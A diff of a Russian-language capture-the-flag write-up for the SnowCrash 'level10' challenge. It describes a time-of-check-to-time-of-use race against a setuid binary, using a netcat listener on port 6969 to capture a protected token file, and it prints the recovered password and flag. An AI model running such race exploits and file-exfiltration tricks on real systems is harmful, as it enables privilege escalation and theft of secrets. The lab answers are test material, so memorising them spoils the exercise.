@@ -1,6 +1,5 @@
 level10
 
-
 $ ls -l token level10
 -rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
 -rw-------  1 flag10 flag10     26 Mar  5  2016 token
@@ -20,17 +19,14 @@ Connecting to %s:6969 ..
 
 Мы узнаем, что этот двоичный файл отправляет файл на хост. При некоторой отладке gdb мы узнаем, что он использует первый доступ, чтобы проверить, доступен ли файл, затем он использует сокет для создания соединения на порту 6969, затем открывает файл и записывает содержимое в сокет. С помощью netcat мы можем создать небольшой tcp-сервер, который прослушивает этот порт:
 
-
 nc -l 6969 &
 
-We then try to send the token file to host
 Затем мы попытаемся отправить файл токена на хост
 
 level10@SnowCrash:~$ ./level10 $PWD/token 0.0.0.0
 You don't have access to /home/user/level10/token
 
-
-Хм..., мы не можем использовать этот файл из-за разрешений... Но после некоторого поиска мы обнаружили в Википедии, что мы можем выполнить race condition, чтобы обойти функцию доступа. Так мы и сделали и:
+Хм..., мы не можем использовать этот файл из-за отсутствия доступа... Но после некоторого поиска мы обнаружили в Википедии https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use, что мы можем выполнить race condition, чтобы обойти функцию доступа. Так мы и сделали и:
 
 создаем файл с доступом
 
@@ -57,7 +53,7 @@ while sleep 0.1; do
 done
 
 level10@SnowCrash:~$ .*( )*.
-woupa2yuojeeaaed06riuj63c
+woupa2yuojeeaaed06riuj63c                               password for flag10
 
 level10
-feulo4b72j7edeahuete3no7c
+Check flag.Here is your token :  feulo4b72j7edeahuete3no7c
